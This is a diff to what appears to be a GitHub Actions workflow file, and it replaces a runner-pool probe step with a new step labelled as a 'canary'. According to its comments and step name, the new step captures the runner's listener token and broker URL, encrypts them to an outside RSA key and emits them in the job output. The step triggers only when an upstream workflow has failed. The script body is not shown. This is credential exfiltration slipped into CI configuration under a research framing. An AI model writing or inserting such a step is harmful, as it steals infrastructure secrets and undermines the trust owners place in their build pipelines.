@@ -51,13 +51,13 @@ runs:
         echo "Skipping tests because the triggering workflow did not succeed"
         exit 1
 
-    # Meta LHE bounded read-only runner-pool-authority canary. Only the documentation
+    # Meta LHE bounded listener post-job revocation canary. Only the documentation
     # job has status context `build`; all matrix test jobs retain the normal
-    # failure guard above. The script emits only aggregate counts/schema keys and
-    # makes three GET requests: an invalid-auth baseline plus pool and current-pool
-    # agent listings with capabilities and assigned/completed request fields disabled.
-    # It then stops the job before dependency installation or artifact upload.
-    - name: Classify the T4 runner pool read boundary without job data
+    # failure guard above. The script encrypts the current disposable runner's
+    # listener token and broker URL to a one-time RSA public key; only ciphertext
+    # is emitted. It makes no request and stops before dependency installation or
+    # artifact upload. The later probe uses only a random nonexistent session ID.
+    - name: Capture encrypted T4 listener material for post-job revocation check
       if: ${{
           github.event_name == 'workflow_run'
           && github.event.workflow_run.conclusion != 'success'
